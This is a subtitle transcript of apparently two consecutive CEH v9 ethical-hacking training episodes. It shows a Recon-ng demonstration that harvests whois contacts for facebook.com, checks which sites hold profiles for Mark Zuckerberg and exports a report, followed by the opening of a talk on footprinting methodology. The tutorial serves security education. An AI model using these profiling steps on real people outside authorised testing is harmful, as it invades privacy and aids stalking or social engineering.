tool.\n\n853\n00:41:57.700 --> 00:42:00.780\nAnd what we're gonna do,\nis now that we've added our workspace,\n\n854\n00:42:00.780 --> 00:42:04.120\nwe're gonna load one of the modules\nthat we need to use this.\n\n855\n00:42:04.120 --> 00:42:06.930\nThe first module is gonna\nbe called the recon module.\n\n856\n00:42:06.930 --> 00:42:08.610\nSo we're gonna load recon.\n\n857\n00:42:08.610 --> 00:42:12.130\nAnd then we're going to do domains.\n\n858\n00:42:12.130 --> 00:42:14.400\nOf course,\nwe need to spell that correctly.\n\n859\n00:42:14.400 --> 00:42:16.440\nMy downfall is my typing, right?\n\n860\n00:42:16.440 --> 00:42:22.110\nSo we're gonna load recon on forward\nslash no space domains dash contacts.\n\n861\n00:42:22.110 --> 00:42:25.460\nWe're looking for the module we're using,\nthe module that looks for domains and\n\n862\n00:42:25.460 --> 00:42:31.150\ncontacts, and\nthen we're gonna do forward slash whois.\n\n863\n00:42:31.150 --> 00:42:32.830\nYou guys know about whois.\n\n864\n00:42:32.830 --> 00:42:36.670\nWe did this earlier,\nunderscore POCS, all right?\n\n865\n00:42:36.670 --> 00:42:38.000\nAnd we're gonna hit enter.\n\n866\n00:42:38.000 --> 00:42:42.570\nWe're gonna use the arrow in who\nis the module to harvest POC data.\n\n867\n00:42:42.570 --> 00:42:45.810\nPoint of contact data from the whois\nqueries for the given domain, right.\n\n868\n00:42:45.810 --> 00:42:47.040\n>> Very clever.\n\n869\n00:42:47.040 --> 00:42:49.120\n>> Publicly available contacts,\nso we're gonna do that.\n\n870\n00:42:49.120 --> 00:42:49.810\nI know it's very clever.\n\n871\n00:42:49.810 --> 00:42:51.245\nI stayed up all night trying to do that.\n\n872\n00:42:51.245 --> 00:42:55.140\n>> [LAUGH]\n>> And so we're gonna load that.\n\n873\n00:42:55.140 --> 00:42:57.180\nSo long as I spell that correctly,\nof course.\n\n874\n00:42:57.180 --> 00:43:00.510\nLoad recom and\njust make sure domains dash contacts,\n\n875\n00:43:00.510 --> 00:43:04.850\nright, whois_pocs, right, yes, okay, good.\n\n876\n00:43:04.850 --> 00:43:08.830\nAll right, so we're gonna load that,\nand then once we've done that,\n\n877\n00:43:08.830 --> 00:43:11.400\nwe're gonna set our source for\nwhat domain we want to go target.\n\n878\n00:43:11.400 --> 00:43:13.290\nIn other words,\nnow we've loaded the module.\n\n879\n00:43:13.290 --> 00:43:14.055\nNothing happens yet.\n\n880\n00:43:14.055 --> 00:43:15.494\n>> Right.\n>> I just wanna make sure I spelled\n\n881\n00:43:15.494 --> 00:43:16.330\ncorrectly.\n\n882\n00:43:16.330 --> 00:43:19.650\nNow, we have to tell it, hey, what domain\ndo you want us to go and set your profile?\n\n883\n00:43:19.650 --> 00:43:20.600\nWell, that's easy.\n\n884\n00:43:20.600 --> 00:43:21.970\nWe'll do a set source.\n\n885\n00:43:21.970 --> 00:43:26.470\nSo set source and then, on this case,\nwe're gonna do facebook.com.\n\n886\n00:43:26.470 --> 00:43:29.577\nNow, we can do anything, any domain.\n\n887\n00:43:29.577 --> 00:43:32.410\nSet source facebook.com.\n\n888\n00:43:32.410 --> 00:43:35.768\nNotice it says,\nthe domain there is facebook.com.\n\n889\n00:43:35.768 --> 00:43:39.730\nSource is facebook.com, so\nwe've essentially set that right now.\n\n890\n00:43:39.730 --> 00:43:41.690\nNow again, remember we can do any domain.\n\n891\n00:43:41.690 --> 00:43:44.360\nNow, we're going to do the following.\n\n892\n00:43:46.330 --> 00:43:48.395\nHardest part of the whole thing, run.\n\n893\n00:43:48.395 --> 00:43:50.720\n>> [LAUGH]\n>> Now, it's gonna go out,\n\n894\n00:43:50.720 --> 00:43:53.590\nit's going out and\nstarting to profile and starting to scan.\n\n895\n00:43:53.590 --> 00:43:55.780\nAnd look at the first line there,\nit's whois arrow net.\n\n896\n00:43:55.780 --> 00:43:59.620\nThen the next one is it's going to whois,\nit's looking up and\n\n897\n00:43:59.620 --> 00:44:04.010\ndoing some look ups against all these\ndomains and all these databases or\n\n898\n00:44:04.010 --> 00:44:07.280\nrather this domain in these databases,\nlooking for information.\n\n899\n00:44:07.280 --> 00:44:09.560\nWe're gonna give that a minute,\nit's gonna go out do it stuff,\n\n900\n00:44:09.560 --> 00:44:13.850\nit's gonna find whoever is listed there,\nokay, so we're gonna let that run,\n\n901\n00:44:13.850 --> 00:44:19.170\nit's gonna extract the contacts associated\nwith the domain and display them.\n\n902\n00:44:19.170 --> 00:44:21.220\nSo we're looking for\npoint of contact information for\n\n903\n00:44:21.220 --> 00:44:22.750\nall the name registration record.\n\n904\n00:44:22.750 --> 00:44:26.340\nRemember I had you go to the whois\ndatabase and say, hey, can we see ITProTV?\n\n905\n00:44:26.340 --> 00:44:28.440\nYou didn't see anything, right.\n\n906\n00:44:28.440 --> 00:44:31.630\nThis will tell us, this is another way\nof getting that same information, but\n\n907\n00:44:31.630 --> 00:44:34.420\ndoing so without bothering to do\nit in the graphical interface.\n\n908\n00:44:34.420 --> 00:44:36.670\nJust another way of getting\nthe same information.\n\n909\n00:44:36.670 --> 00:44:41.580\nSo now we've done that,\nand now what we can do,\n\n910\n00:44:41.580 --> 00:44:44.930\nis we can go back into our work space.\n\n911\n00:44:44.930 --> 00:44:48.430\nSo we'll go back, just to get out\nof the prompt for the module.\n\n912\n00:44:48.430 --> 00:44:51.160\nAnd because we're in\nthe whois POCS module.\n\n913\n00:44:51.160 --> 00:44:52.550\nSo we're gonna back up one.\n\n914\n00:44:52.550 --> 00:44:55.950\nAnd so now that we have\nthe information with the domains and\n\n915\n00:44:55.950 --> 00:45:01.010\ntheir contacts, we now have to use\nanother recon module to operate on that.\n\n916\n00:45:01.010 --> 00:45:02.290\nSo we're gonna load another module.\n\n917\n00:45:02.290 --> 00:45:06.070\nSo we're gonna go back and\nload another recon forward slash,\n\n918\n00:45:06.070 --> 00:45:08.930\nthis time profiles and name check.\n\n919\n00:45:08.930 --> 00:45:11.890\nDo those people have profiles on\nthe site and still validate them and\n\n920\n00:45:11.890 --> 00:45:15.070\ncheck them and cross-reference and\ngive me that information.\n\n921\n00:45:15.070 --> 00:45:16.560\nSo we're gonna load that up right now.\n\n922\n00:45:16.560 --> 00:45:22.078\nSo we're gonna do recon profiles,\nand then dash profiles,\n\n923\n00:45:22.078 --> 00:45:26.390\nand then, if I spell it correctly,\nforward slash and\n\n924\n00:45:26.390 --> 00:45:31.140\nnamechk, namechk not the check\nfully spelled out but namechk.\n\n925\n00:45:31.140 --> 00:45:32.995\nWe're gonna do that.\n\n926\n00:45:32.995 --> 00:45:36.870\nUh-oh, what did I do.\n\n927\n00:45:36.870 --> 00:45:37.570\nOne second.\n\n928\n00:45:37.570 --> 00:45:39.770\nHold on.\n\n929\n00:45:39.770 --> 00:45:41.550\nRecon profiles.\n\n930\n00:45:41.550 --> 00:45:43.720\nMy spelling correctly.\n\n931\n00:45:43.720 --> 00:45:48.020\nDash, profiles slash name chk.\n\n932\n00:45:48.020 --> 00:45:52.250\nThat should be right.\n\n933\n00:45:52.250 --> 00:45:54.550\nYeah, I may have just\nnot spelled correctly.\n\n934\n00:45:54.550 --> 00:45:55.900\nLet me just double check.\n\n935\n00:45:55.900 --> 00:45:57.878\nOr I may have just put a space in or\nsomething.\n\n936\n00:45:59.795 --> 00:46:01.080\nAll right, so, I know why.\n\n937\n00:46:01.080 --> 00:46:02.640\nI'm stupid.\nBecause I didn't put\n\n938\n00:46:02.640 --> 00:46:04.030\nload in front of it, that's why.\n\n939\n00:46:04.030 --> 00:46:04.595\n>> [LAUGH]\n>> Okay hold on.\n\n940\n00:46:04.595 --> 00:46:05.640\n>> [LAUGH]\n>> I've been calling the module.\n\n941\n00:46:05.640 --> 00:46:06.450\nI forgot to tell it to load it.\n\n942\n00:46:06.450 --> 00:46:09.250\nIt's a perfectly right command, I just\nforgot to write the word load in front of\n\n943\n00:46:09.250 --> 00:46:10.520\nit to tell it what action to take.\n\n944\n00:46:10.520 --> 00:46:12.540\nAll right, so we're gonna load that.\n\n945\n00:46:12.540 --> 00:46:16.432\nSo we're gonna load the recon profile or\nload recon with the profiles and\n\n946\n00:46:16.432 --> 00:46:17.650\nnamechk options.\n\n947\n00:46:17.650 --> 00:46:20.000\nSo we're gonna load that,\nget into that work space.\n\n948\n00:46:20.000 --> 00:46:21.490\nNow I have to set the source again.\n\n949\n00:46:21.490 --> 00:46:24.390\nIn other words, last time I set\nthe source for facebook.com,\n\n950\n00:46:24.390 --> 00:46:28.650\nnow I want to say what person,\nwhat actual user do I want to profile.\n\n951\n00:46:28.650 --> 00:46:30.810\nThis is where I get\nthe Mark Zuckerberg information.\n\n952\n00:46:30.810 --> 00:46:35.430\nSo I'm going to do a set source again,\nbut this time I'm gonna set the name.\n\n953\n00:46:35.430 --> 00:46:42.240\nSo I'm gonna do Mark Zuckerberg, Zuck\nZ-U-C-K-E-R-B-E-R-G, I believe, right?\n\n954\n00:46:42.240 --> 00:46:45.960\nZuckerberg, all right, so\nI'm gonna do that, press enter.\n\n955\n00:46:45.960 --> 00:46:47.680\nI've gone ahead and set that up.\n\n956\n00:46:47.680 --> 00:46:49.086\nNow what's the magic command?\n\n957\n00:46:49.086 --> 00:46:53.350\n>> Run [LAUGH]\n>> Okay, so we're gonna run.\n\n958\n00:46:53.350 --> 00:46:55.320\nWoops, darn.\n\n959\n00:46:55.320 --> 00:46:57.690\nActually have to type all three letters,\nthere we go.\n\n960\n00:46:57.690 --> 00:47:00.640\nWe're gonna run now it's\nretrieving site data, and\n\n961\n00:47:00.640 --> 00:47:03.160\nas soon as that parses the data, right?\n\n962\n00:47:03.160 --> 00:47:07.820\nWe should see something like user\nexists when it finds a user, let's see.\n\n963\n00:47:07.820 --> 00:47:09.270\nWe may not.\n\n964\n00:47:09.270 --> 00:47:12.670\nConnection reset by peer, okay.\n\n965\n00:47:12.670 --> 00:47:13.230\nLet's try that.\n\n966\n00:47:13.230 --> 00:47:15.158\nThey may be on to me because\nI did this yesterday.\n\n967\n00:47:15.158 --> 00:47:17.510\n>> [LAUGH]\n>> Let's try this one more time.\n\n968\n00:47:17.510 --> 00:47:18.920\nThere we go, okay, now we got it.\n\n969\n00:47:18.920 --> 00:47:21.040\nIt may have just been\na flutter in the Internet.\n\n970\n00:47:21.040 --> 00:47:23.890\nSo you can see there retrieving site data,\nMark Zuckerberg.\n\n971\n00:47:23.890 --> 00:47:26.770\nAnd you see I've got some\nuser exists things, Facebook.\n\n972\n00:47:26.770 --> 00:47:29.100\nYou'd hope he exists there, right?\n\n973\n00:47:29.100 --> 00:47:29.931\n>> Yeah.\n\n974\n00:47:29.931 --> 00:47:32.068\n[LAUGH]\n>> By the way, it's telling me for\n\n975\n00:47:32.068 --> 00:47:36.220\nstuff like Google+ and Instagram, that\nthere is no user Mark Zuckerberg there.\n\n976\n00:47:36.220 --> 00:47:40.920\nIt's available.\nBut for Blogger and for YouTube and for\n\n977\n00:47:40.920 --> 00:47:42.090\nall the other ones, he exists.\n\n978\n00:47:42.090 --> 00:47:45.740\nSo it's telling me on the top ones that\nare in the wish list of all the sites that\n\n979\n00:47:45.740 --> 00:47:48.670\nare programmed into the tool\nthat are loaded by default.\n\n980\n00:47:48.670 --> 00:47:50.500\nIt tells me whether or not they exist.\n\n981\n00:47:50.500 --> 00:47:53.630\nSo I can see what sites they're on and\nwhich sites they're not as well.\n\n982\n00:47:53.630 --> 00:47:54.850\nWhich is actually kinda cool.\n\n983\n00:47:56.120 --> 00:47:57.290\n>> Absolutely.\n>> So we're able to go in,\n\n984\n00:47:57.290 --> 00:47:59.880\nwe're doing that, so\nagain we're just waiting on it to finish.\n\n985\n00:47:59.880 --> 00:48:01.390\nIt's not quite done yet, there we go.\n\n986\n00:48:01.390 --> 00:48:04.178\nWe get some red at the bottom\nsaying those sites don't exist,\n\n987\n00:48:04.178 --> 00:48:05.740\nit hasn't been able to find that.\n\n988\n00:48:05.740 --> 00:48:10.471\nSo we've got all that, so I've got 42\nprofiles that were ultimately found where\n\n989\n00:48:10.471 --> 00:48:13.750\nhe exists and\nthat information is there about him.\n\n990\n00:48:13.750 --> 00:48:17.926\nAt that point, what I would then do,\nis I would have to generate a report so.\n\n991\n00:48:17.926 --> 00:48:20.845\nWe'll just hit back again,\nthen I have to load reporting.\n\n992\n00:48:20.845 --> 00:48:25.540\nSo we'll do load reporting,\ndidn't forget the load option this time.\n\n993\n00:48:25.540 --> 00:48:28.790\nAnd so when I load reporting,\nI get the reporting options and\n\n994\n00:48:28.790 --> 00:48:34.580\nI can export out to CSV, HTML,\nJSON, List, Pushpin, XLXS, or XML.\n\n995\n00:48:34.580 --> 00:48:36.750\nI just choose my option,\nI did XML, excuse me, I did HTML.\n\n996\n00:48:36.750 --> 00:48:40.500\nSo I would do load reporting HTML.\n\n997\n00:48:40.500 --> 00:48:42.620\nSo let's just do that real quick.\n\n998\n00:48:42.620 --> 00:48:46.380\nThere's a couple options we need to set,\nso I just want to show them to you.\n\n999\n00:48:46.380 --> 00:48:49.350\nSo slash whatever the option is,\nin this case HTML.\n\n1000\n00:48:49.350 --> 00:48:50.400\nAll right, so I've done that.\n\n1001\n00:48:50.400 --> 00:48:54.371\nSo now I have to assign values for\ncreator, customer and file names.\n\n1002\n00:48:54.371 --> 00:48:58.095\nSo I have to do set command for\nfile name, set command for\n\n1003\n00:48:58.095 --> 00:49:02.610\ncreator, set customer name and\nthen I output the report right.\n\n1004\n00:49:02.610 --> 00:49:10.020\nSo I would do set file name, and\nI have to specify path, so I would do\n\n1005\n00:49:14.100 --> 00:49:20.980\nAdam and then let me just make sure I\nknow what my path was to my document.\n\n1006\n00:49:20.980 --> 00:49:22.120\nI think it's just Adam, right?\n\n1007\n00:49:23.210 --> 00:49:25.850\nThe folder I think it was just Adam,\nlet me go take a look.\n\n1008\n00:49:25.850 --> 00:49:29.080\nI think I just created it as Adam, right?\n\n1009\n00:49:29.080 --> 00:49:30.690\nYeah, so it's just Adam there.\n\n1010\n00:49:30.690 --> 00:49:32.110\nSo I can just go to Adam.\n\n1011\n00:49:34.090 --> 00:49:37.970\nSo Adam, and then let me just\ncome back down here, one second,\n\n1012\n00:49:37.970 --> 00:49:41.700\nthere we go and then, I just have to\nput in the name that I wanna use.\n\n1013\n00:49:41.700 --> 00:49:46.800\nSo I'll call this adamres.html, okay.\n\n1014\n00:49:48.230 --> 00:49:50.580\nSo we put it there, so\nit hasn't done it yet,\n\n1015\n00:49:50.580 --> 00:49:52.950\nI'm just profiling and\nputting in all the information.\n\n1016\n00:49:52.950 --> 00:49:58.422\nI've set the creator variable,\nwho's the creator of the report,\n\n1017\n00:49:58.422 --> 00:50:02.270\nSnoopy1, all right, and then set customer.\n\n1018\n00:50:04.530 --> 00:50:07.670\nThat's just the tag for\nthe person in the report, I'll do MZ.\n\n1019\n00:50:10.020 --> 00:50:15.260\nAnd then what's the powerful tool right or\nthe powerful\n\n1020\n00:50:15.260 --> 00:50:18.510\ncommand line run if my path was correct\nI think I don't have my path correct.\n\n1021\n00:50:18.510 --> 00:50:22.230\nIt's probably got to be root Adam cuz\nI'm in the root directory, but if I\n\n1022\n00:50:22.230 --> 00:50:26.470\nput in the right information there, just\nin terms of the file path, it'll actually\n\n1023\n00:50:26.470 --> 00:50:30.710\nspit out the report and when it does,\nas you just saw, I get the report right?\n\n1024\n00:50:32.450 --> 00:50:36.250\nAnd I will be able to do this right?\n\n1025\n00:50:36.250 --> 00:50:40.380\nAnd I can go into Adam and\nI can find my report right there and\n\n1026\n00:50:40.380 --> 00:50:42.050\nI'll be able to see it, and\nI'll just be able to pull it up.\n\n1027\n00:50:42.050 --> 00:50:43.855\nAnd it'll just be sitting\nthere essentially right?\n\n1028\n00:50:43.855 --> 00:50:46.160\n>> Sure.\n>> So I can actually do that, and\n\n1029\n00:50:46.160 --> 00:50:48.840\nuse this tool to pull down all\nthat data and to profile it.\n\n1030\n00:50:50.090 --> 00:50:51.455\nVery neat when you think about it.\n\n1031\n00:50:51.455 --> 00:50:56.480\n>> Absolutely, very powerful stuff, that\nyou can accomplish with a tool like that,\n\n1032\n00:50:56.480 --> 00:50:57.420\na lot of information.\n\n1033\n00:50:57.420 --> 00:50:59.310\nWe could even, and really,\nthat's what it's all about, right?\n\n1034\n00:50:59.310 --> 00:51:02.070\nWe're trying to do reconnaissance,\nwe're doing that foot printing.\n\n1035\n00:51:02.070 --> 00:51:07.040\nWe're gathering information on our target,\nwe're trying\n\n1036\n00:51:07.040 --> 00:51:10.650\nto get all the information we can really\nwithout crossing any lines at this point.\n\n1037\n00:51:10.650 --> 00:51:14.540\nJust trying to retrieve as much as we can\ncuz as Adam has said a couple of times,\n\n1038\n00:51:14.540 --> 00:51:18.880\nit's not this piece of information or that\npiece of information, really that gets you\n\n1039\n00:51:18.880 --> 00:51:23.570\nin or does the trick, it's aggregating\nall of this information together,\n\n1040\n00:51:23.570 --> 00:51:27.520\nstarting to put together a bigger\npicture where we can see all of that,\n\n1041\n00:51:27.520 --> 00:51:29.570\nthat's when it really\nstarts to be powerful.\n\n1042\n00:51:29.570 --> 00:51:32.490\nAnd as he also showed you,\nseveral different tools that we\n\n1043\n00:51:32.490 --> 00:51:36.640\ncan use to accomplish the same thing, some\nof them very specific in what they return,\n\n1044\n00:51:36.640 --> 00:51:38.580\nsome of them, kind of the swiss army,\n\n1045\n00:51:38.580 --> 00:51:43.480\nwhere they'll return,\nmore than just resolve a name, like Ping.\n\n1046\n00:51:43.480 --> 00:51:46.468\nWe're able to see it resolve\nthat name into an IP address.\n\n1047\n00:51:46.468 --> 00:51:48.980\nWe do Tracer,\nwe can still see that resolution, but\n\n1048\n00:51:48.980 --> 00:51:50.580\nwe can also see some of\nthe hops in the path.\n\n1049\n00:51:50.580 --> 00:51:53.240\nSo depending on what information\nyou're trying to get,\n\n1050\n00:51:53.240 --> 00:51:55.080\ndifferent tools appropriate for\ndifferent scenarios.\n\n1051\n00:51:55.080 --> 00:51:56.580\nSo appreciate that, Luke.\n\n1052\n00:51:56.580 --> 00:51:58.670\nThose footprinting and\nreconnaissance tools.\n\n1053\n00:51:58.670 --> 00:52:01.830\nHope everybody out there\nenjoyed watching this one.\n\n1054\n00:52:01.830 --> 00:52:05.080\nSigning off for IT Pro.TV,\nI'm Mike Rodrick.\n\n1055\n00:52:05.080 --> 00:52:08.720\n>> I am a suspicious acting\nnetwork information gathering

00:00:16.709\nI'm your host Mike Rodrick.\n\n4\n00:00:16.709 --> 00:00:18.451\nToday we're doing CEH Version nine.\n\n5\n00:00:18.451 --> 00:00:22.150\nAnd specifically in this episode\nwe're continuing on with our\n\n6\n00:00:22.150 --> 00:00:26.310\nfootprinting objectives, or\ntalking about what footprinting is.\n\n7\n00:00:26.310 --> 00:00:27.950\nWe discussed that in a previous episode.\n\n8\n00:00:27.950 --> 00:00:30.300\nNow we're gonna get into\na little bit of methodology.\n\n9\n00:00:30.300 --> 00:00:33.120\nTrying to put a method to\nour madness if you will.\n\n10\n00:00:33.120 --> 00:00:37.240\nJust going around trying to grab\ninformation without any sense\n\n11\n00:00:37.240 --> 00:00:40.330\nof direction,\ncan be a little bit unproductive.\n\n12\n00:00:40.330 --> 00:00:42.770\nSo here to help us with\nthat is mister Adam Gordon.\n\n13\n00:00:42.770 --> 00:00:43.830\nHow are you doing Adam?\n\n14\n00:00:43.830 --> 00:00:45.760\n>> Good.\nI prefer to associate madness with my\n\n15\n00:00:45.760 --> 00:00:46.433\nmethod personally.\n\n16\n00:00:46.433 --> 00:00:47.480\n>> [LAUGH]\n>> That's just me but\n\n17\n00:00:47.480 --> 00:00:49.664\nyou know call me crazy but\nthat's what people say.\n\n18\n00:00:49.664 --> 00:00:50.323\n>> We do all the time.\n\n19\n00:00:50.323 --> 00:00:51.217\n>> So we get.\n\n20\n00:00:51.217 --> 00:00:53.121\n>> [LAUGH]\n>> I know, I've heard that several times.\n\n21\n00:00:53.121 --> 00:00:55.780\nIt's written on the wall\noutside as a matter of fact.\n\n22\n00:00:55.780 --> 00:01:00.570\nAll right, so we're gonna continue talking\nhere about footprinting and specifically\n\n23\n00:01:00.570 --> 00:01:05.210\nwe're gonna start by talking about what\nmost people would call a methodology.\n\n24\n00:01:05.210 --> 00:01:06.640\nAnd indeed it is a methodology.\n\n25\n00:01:06.640 --> 00:01:07.640\nI don't mean to imply it's not.\n\n26\n00:01:07.640 --> 00:01:10.830\nBut, when I say most people,\nwhat I mean is that,\n\n27\n00:01:10.830 --> 00:01:15.720\nnot everybody has a standardized,\ndocumented\n\n28\n00:01:15.720 --> 00:01:19.260\nthought process that they engage in in\norder to go through some sort of activity.\n\n29\n00:01:19.260 --> 00:01:20.150\nSo let me show you what I mean.\n\n30\n00:01:20.150 --> 00:01:22.372\nMike, you're going to help me\nout with this for just a second.\n\n31\n00:01:22.372 --> 00:01:24.149\n>> Okay.\n\n32\n00:01:24.149 --> 00:01:27.900\n>> So [COUGH], when you go and\nI don't know, maybe go to the market.\n\n33\n00:01:27.900 --> 00:01:30.280\nGo to the food market, you buy food.\n\n34\n00:01:30.280 --> 00:01:31.640\nDo you have a process you follow?\n\n35\n00:01:31.640 --> 00:01:33.690\nDo you have a kind of\na standing way you do it?\n\n36\n00:01:33.690 --> 00:01:34.530\n>> I do, I do.\n\n37\n00:01:34.530 --> 00:01:37.950\nI go pretty much by the rows through\nthe store except for the frozen.\n\n38\n00:01:37.950 --> 00:01:38.480\nI leave that for\n\n39\n00:01:38.480 --> 00:01:41.910\nthe end cuz I don't want it in my cart\nmelting while I finish the shopping.\n\n40\n00:01:41.910 --> 00:01:45.170\n>> Okay, so we could say in theory\nthat Mike has a methodology right?\n\n41\n00:01:45.170 --> 00:01:46.000\nHe's got an approach.\n\n42\n00:01:46.000 --> 00:01:47.850\nIt's a pretty standardized one.\n\n43\n00:01:47.850 --> 00:01:51.160\nProbably most of us in theory that go to\nthe market if we do this on a regular\n\n44\n00:01:51.160 --> 00:01:52.330\nbasis.\n\n45\n00:01:52.330 --> 00:01:53.860\nWe probably do something similar.\n\n46\n00:01:53.860 --> 00:01:56.240\nGo through the aisles looking for\nwhat we need.\n\n47\n00:01:56.240 --> 00:01:58.785\nLeave the frozen and\nperishable food for last.\n\n48\n00:01:58.785 --> 00:02:02.645\nProbably, although Mike didn't mention it,\nyou may have a list, you may have coupons,\n\n49\n00:02:02.645 --> 00:02:05.145\nyou may have a budget in mind\nof how much you want to spend.\n\n50\n00:02:05.145 --> 00:02:08.105\nMaybe if he's entertaining he may have\ncertain things that are on the list that\n\n51\n00:02:08.105 --> 00:02:09.685\nhe wants to go get specifically.\n\n52\n00:02:09.685 --> 00:02:11.475\nThere's all these variables, right, but\n\n53\n00:02:11.475 --> 00:02:15.545\nwhat doesn't typically change\nis the core thought process.\n\n54\n00:02:15.545 --> 00:02:18.915\nGo to the store, you achieve\nthe objective, buy the groceries,\n\n55\n00:02:18.915 --> 00:02:21.150\ngo through methodically row by row.\n\n56\n00:02:21.150 --> 00:02:24.930\nLeave the perishables for the end and\nthen in between you may do this or\n\n57\n00:02:24.930 --> 00:02:25.990\nthat depending on what you do.\n\n58\n00:02:25.990 --> 00:02:29.490\nYou may see somebody you know, maybe stop\nand talk to them for a couple of minutes.\n\n59\n00:02:29.490 --> 00:02:32.930\nMaybe you're sampling, I don't know if\nthey do this at the market by you, but\n\n60\n00:02:32.930 --> 00:02:35.530\ndown by me we have a couple of\nthose different kinds of markets.\n\n61\n00:02:35.530 --> 00:02:39.030\nThere's the high-end ones, you know\nlike the Whole Foods, the fresh markets,\n\n62\n00:02:39.030 --> 00:02:40.730\norganic, things like that.\n\n63\n00:02:40.730 --> 00:02:42.060\nThey're always sampling\n>> Yeah.\n\n64\n00:02:42.060 --> 00:02:42.600\n>> Different food.\n\n65\n00:02:42.600 --> 00:02:44.880\nYou go to Costco and\nBJ's to do that kind of stuff too.\n\n66\n00:02:44.880 --> 00:02:47.240\nSo you may stop,\ntry something, go that's good.\n\n67\n00:02:47.240 --> 00:02:50.150\nAnd then you know wanna buy that even\nthough it wasn't on the list, right?\n\n68\n00:02:50.150 --> 00:02:51.730\nSo you have all these variables.\n\n69\n00:02:51.730 --> 00:02:52.310\nBut ultimately,\n\n70\n00:02:52.310 --> 00:02:55.700\nthere's this core foundational set\nof elements that we always engaging.\n\n71\n00:02:55.700 --> 00:02:58.946\nThat's really what a methodology is and\nwhen we think about footprinting,\n\n72\n00:02:58.946 --> 00:03:02.445\nmuch like we think about any of the other\ntopics we're gonna be going through in our\n\n73\n00:03:02.445 --> 00:03:06.470\nconversation around the body of knowledge\nassociate with certified ethical hacking.\n\n74\n00:03:06.470 --> 00:03:08.929\nWe have to think about the methodology\nassociated with footprinting.\n\n75\n00:03:08.929 --> 00:03:13.524\nRight, because we have to engage in\na fairly specific, fairly ordered,\n\n76\n00:03:13.524 --> 00:03:18.492\nfairly clearly identified number of steps\nin a certain order to really engage in\n\n77\n00:03:18.492 --> 00:03:22.070\nfoot-printing and\nto do reconnaissance the right way.\n\n78\n00:03:22.070 --> 00:03:24.640\nAnd so we wanna share that with you,\ntalk a bit about it.\n\n79\n00:03:24.640 --> 00:03:29.190\nThere's ten steps in theory, involved in a\nmethodology associated with footprinting.\n\n80\n00:03:29.190 --> 00:03:30.390\nA lot of them are really just,\n\n81\n00:03:30.390 --> 00:03:33.440\nhey we should go to this area,\ndo this kind of footprinting.\n\n82\n00:03:33.440 --> 00:03:37.275\nYou saw, if you have, gone through and\nseen our prior episode with regards to,\n\n83\n00:03:37.275 --> 00:03:39.691\nthe demonstrations we\ndid around footprinting.\n\n84\n00:03:39.691 --> 00:03:43.029\nWe took a look at some different tools,\ntook a look at Recon-ng, for\n\n85\n00:03:43.029 --> 00:03:46.428\ninstance showing how we could go out and\nprofile somebody on the web and\n\n86\n00:03:46.428 --> 00:03:48.460\nlook at all their social media accounts.\n\n87\n00:03:48.460 --> 00:03:52.050\nAnd we took a look at different ways\nwe could use a variety of tools\n\n88\n00:03:52.050 --> 00:03:54.010\nto do footprinting and recon.\n\n89\n00:03:54.010 --> 00:03:55.665\nWent on to use something\nas simple as Ping.\n\n90\n00:03:55.665 --> 00:03:59.286\nAnd we used something more complicated\nalong the way, to be able to step up and\n\n91\n00:03:59.286 --> 00:04:01.210\nlook at things like Traceroute.\n\n92\n00:04:01.210 --> 00:04:05.340\nWe looked at some other tools that would\nbe helpful to allow us to get a feel for\n\n93\n00:04:05.340 --> 00:04:07.020\nwhat's going on an operating system.\n\n94\n00:04:07.020 --> 00:04:09.410\nIf you haven't seen that episode\ndefinitely want to go back,\n\n95\n00:04:09.410 --> 00:04:10.590\ntake a look at that.\n\n96\n00:04:10.590 --> 00:04:12.483\nMike played a crucial\npart in that episode.\n\n97\n00:04:12.483 --> 00:04:14.110\n>> [LAUGH]\n>> Was the pivotal lynch pin for\n\n98\n00:04:14.110 --> 00:04:16.480\nwhat we were able to accomplish there.\n\n99\n00:04:16.480 --> 00:04:19.380\nBut in this episode we're gonna actually\ntalk through, we're actually gonna do\n\n100\n00:04:19.380 --> 00:04:22.755\na little show and tell all kidding aside,\nMike is gonna help me with this.\n\n101\n00:04:22.755 --> 00:04:24.420\nWe've got some websites and\nsome things setup,\n\n102\n00:04:24.420 --> 00:04:27.270\nwe're gonna take a look at live in\nreal time as we go through here.\n\n103\n00:04:27.270 --> 00:04:28.320\nBut we're not gonna break away and\n\n104\n00:04:28.320 --> 00:04:30.940\ndo a whole separate set of demos\nthe way we did in the prior set.\n\n105\n00:04:30.940 --> 00:04:33.010\nWe're just gonna talk\nthrough the methodology and\n\n106\n00:04:33.010 --> 00:04:34.660\nshow you along the way what we mean.\n\n107\n00:04:34.660 --> 00:04:38.410\nLet's start by enumerating or talking\nabout what the methodology implies,\n\n108\n00:04:38.410 --> 00:04:39.100\nthe different steps.\n\n109\n00:04:39.100 --> 00:04:42.210\nSo step one we're going to be\nfootprinting through a search engine.\n\n110\n00:04:42.210 --> 00:04:45.430\nSo let's go ahead and let's actually\nif we can go to Mike's machine for\n\n111\n00:04:45.430 --> 00:04:47.330\na minute, let's take a look.\n\n112\n00:04:47.330 --> 00:04:48.830\nYou and I had been going through.\n\n113\n00:04:48.830 --> 00:04:51.620\nWe'd been talking about Google and I've\nbeen talking about a couple of the other\n\n114\n00:04:51.620 --> 00:04:53.225\nthings we're going to take a look at.\n\n115\n00:04:53.225 --> 00:04:56.965\nOn the screen, what you're seeing on\nMike's machine is just the Google search\n\n116\n00:04:56.965 --> 00:04:59.325\nengine but\nusing the advanced search feature.\n\n117\n00:04:59.325 --> 00:05:03.165\nYou may or may not have realized that\nGoogle has an advanced search future.\n\n118\n00:05:03.165 --> 00:05:06.650\nWhat you do is you essentially\ngo into the settings.\n\n119\n00:05:06.650 --> 00:05:08.750\nAnd you're able to access\nthe advanced search.\n\n120\n00:05:08.750 --> 00:05:12.060\nBeing able to narrow or\nnarrowly define the search field.\n\n121\n00:05:12.060 --> 00:05:13.630\nBy being able to add parameters.\n\n122\n00:05:13.630 --> 00:05:17.040\nAnd so I think if I'm not mistaken up at\nthe top there we have the search term\n\n123\n00:05:17.040 --> 00:05:17.620\nsecured.\n\n124\n00:05:17.620 --> 00:05:18.120\nRight?\n>> I do.\n\n125\n00:05:18.120 --> 00:05:20.035\n>> And so we could then go in.\n\n126\n00:05:20.035 --> 00:05:21.435\nAnd we'll give Mike a second to zoom in\n\n127\n00:05:21.435 --> 00:05:22.550\nand kind of move over.\n\n128\n00:05:22.550 --> 00:05:26.040\nWe could go in and we could then\nadd some additional identifiers.\n\n129\n00:05:26.040 --> 00:05:27.110\nNarrowing the search.\n\n130\n00:05:27.110 --> 00:05:29.910\nOr further refining it for\nwhat we're looking for.\n\n131\n00:05:29.910 --> 00:05:33.570\nSo instead 